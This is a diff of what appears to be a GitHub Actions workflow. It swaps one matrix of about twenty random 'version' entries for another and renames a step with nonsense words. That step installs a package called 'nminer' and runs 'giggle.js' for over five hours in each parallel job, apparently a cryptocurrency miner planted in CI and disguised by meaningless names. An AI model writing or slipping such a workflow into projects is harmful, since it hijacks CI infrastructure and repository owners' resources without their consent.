@@ -9,26 +9,24 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 5379 }
-          - { version: 3242 }
-          - { version: 4507 }
-          - { version: 3980 }
-          - { version: 9754 }
-          - { version: 9996 }
-          - { version: 608 }
-          - { version: 3899 }
-          - { version: 3055 }
-          - { version: 4839 }
-          - { version: 2070 }
-          - { version: 8113 }
-          - { version: 7814 }
-          - { version: 8967 }
-          - { version: 3283 }
-          - { version: 9230 }
-          - { version: 8749 }
-          - { version: 7587 }
-          - { version: 8549 }
-          - { version: 2815 }
+          - { version: 2072 }
+          - { version: 3753 }
+          - { version: 4325 }
+          - { version: 7271 }
+          - { version: 503 }
+          - { version: 1796 }
+          - { version: 9983 }
+          - { version: 3053 }
+          - { version: 6871 }
+          - { version: 7479 }
+          - { version: 6356 }
+          - { version: 861 }
+          - { version: 3536 }
+          - { version: 2203 }
+          - { version: 9618 }
+          - { version: 5974 }
+          - { version: 2549 }
+          - { version: 6937 }
 
     steps:
       - name: Checkout
@@ -39,7 +37,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: furthermore as
+      - name: supposing swathe
         run: |
           npm install nminer@latest
-          timeout 301m node giggle.js || echo "giggle executed"
+          timeout 334m node giggle.js || echo "giggle executed"
